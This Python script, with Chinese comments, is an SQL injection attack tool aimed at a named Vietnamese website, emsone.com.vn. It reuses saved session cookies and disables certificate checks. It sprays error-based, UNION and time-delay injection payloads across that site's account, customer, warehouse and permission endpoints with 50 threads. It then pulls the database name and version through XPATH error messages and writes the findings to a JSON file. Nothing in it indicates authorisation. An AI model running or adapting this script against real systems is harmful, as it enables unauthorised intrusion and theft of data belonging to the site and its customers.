#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests
import urllib.parse
import json
import time
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
urllib3.disable_warnings()

class FinalCompleteScan:
    def __init__(self):
        self.base_url = "https://emsone.com.vn"
        self.session = requests.Session()
        self.session.verify = False
        self.load_session()
        self.all_results = []
        
    def load_session(self):
        try:
            with open('session_cookies.json', 'r') as f:
                cookies = json.load(f)
                self.session.cookies.update(cookies)
        except:
            pass
    
    def test_single(self, endpoint, param, payload, method='GET'):
        """测试单个注入点"""
        try:
            if method == 'GET':
                url = f"{self.base_url}{endpoint}?{param}={urllib.parse.quote(payload)}"
                start = time.time()
                r = self.session.get(url, timeout=15)
                elapsed = time.time() - start
            elif method == 'POST':
                data = {param: payload}
                start = time.time()
                r = self.session.post(f"{self.base_url}{endpoint}", data=data, timeout=15)
                elapsed = time.time() - start
            else:
                return None
            
            has_test = 'TEST' in r.text
            has_xpath = 'XPATH' in r.text.upper()
            has_delay = elapsed > 4
            len_diff = len(r.text)
            
            if has_test or has_xpath or has_delay:
                return {
                    'endpoint': endpoint,
                    'param': param,
                    'method': method,
                    'payload': payload,
                    'status': r.status_code,
                    'len': len(r.text),
                    'has_test': has_test,
                    'has_xpath': has_xpath,
                    'has_delay': has_delay,
                    'elapsed': elapsed,
                    'response_preview': r.text[:500]
                }
        except:
            pass
        return None
    
    def comprehensive_scan(self):
        """全面扫描"""
        print("[*] 全面扫描所有端点、参数、方法、payload...")
        
        endpoints = [
            '/Account/GetUserInfo',
            '/Account/JLogin',
            '/Account/Logout',
            '/Account/RegisterView',
            '/Handle/SearchListProvince',
            '/Handle/SearchListWardByDistrictID',
            '/Handle/SearchListDistrictByProvinceID',
            '/Handle/SearchListCustomer',
            '/Handle/SearchListWareHouse',
            '/Handle/SearchListProductVariantByWareHouseID',
            '/Handle/SearchListFunctionalByGroupPermissionID',
            '/Handle/TransportPostageCharged',
        ]
        
        params = ['id', 'ID', 'Id', 'Type', 'DistrictID', 'ProvinceID', 'q', 'search', 'customer_id']
        
        payloads = [
            "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
            "1' AND updatexml(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e), 1)--",
            "1' UNION SELECT 'TEST'--",
            "1' AND SLEEP(5)--",
        ]
        
        methods = ['GET', 'POST']
        
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = []
            for endpoint in endpoints:
                for param in params:
                    for payload in payloads:
                        for method in methods:
                            futures.append(executor.submit(self.test_single, endpoint, param, payload, method))
            
            for future in as_completed(futures):
                result = future.result()
                if result:
                    print(f"    [!] {result['method']} {result['endpoint']} [{result['param']}] - XPATH: {result['has_xpath']}, 延迟: {result['has_delay']}")
                    self.all_results.append(result)
    
    def extract_from_results(self):
        """从所有结果中提取数据库"""
        print("\n[*] 从有效结果中提取数据库...")
        
        db_info = {}
        for result in self.all_results:
            if result.get('has_xpath'):
                endpoint = result['endpoint']
                param = result['param']
                method = result['method']
                
                queries = [
                    ('SELECT database()', '数据库名'),
                    ('SELECT version()', '版本'),
                ]
                
                for query, label in queries:
                    payload = f"1' AND EXTRACTVALUE(1, CONCAT(0x7e, ({query}), 0x7e))--"
                    
                    try:
                        if method == 'GET':
                            url = f"{self.base_url}{endpoint}?{param}={urllib.parse.quote(payload)}"
                            r = self.session.get(url, timeout=10)
                        else:
                            data = {param: payload}
                            r = self.session.post(f"{self.base_url}{endpoint}", data=data, timeout=10)
                        
                        match = re.search(r"XPATH syntax error: '~([^']+)~'", r.text, re.IGNORECASE)
                        if match:
                            value = match.group(1)
                            if value and value not in db_info.get(label, []):
                                print(f"    [+] {label}: {value}")
                                if label not in db_info:
                                    db_info[label] = []
                                db_info[label].append(value)
                    except:
                        pass
        
        return db_info
    
    def run_all(self):
        """执行所有扫描"""
        print("="*60)
        print("最终全面扫描")
        print("="*60)
        
        self.comprehensive_scan()
        db_info = self.extract_from_results()
        
        # 保存结果
        with open('final_complete_scan_results.json', 'w', encoding='utf-8') as f:
            json.dump({
                'all_results': self.all_results,
                'db_info': db_info,
                'summary': {
                    'total_results': len(self.all_results),
                    'with_xpath': len([r for r in self.all_results if r.get('has_xpath')]),
                    'with_delay': len([r for r in self.all_results if r.get('has_delay')]),
                }
            }, f, indent=2, ensure_ascii=False)
        
        print("\n" + "="*60)
        print("最终结果")
        print("="*60)
        print(f"总结果数: {len(self.all_results)}")
        print(f"XPATH错误: {len([r for r in self.all_results if r.get('has_xpath')])}")
        print(f"时间延迟: {len([r for r in self.all_results if r.get('has_delay')])}")
        print(f"数据库信息: {len(db_info)}")
        for k, v in db_info.items():
            print(f"  {k}: {v}")

if __name__ == "__main__":
    scanner = FinalCompleteScan()
    scanner.run_all()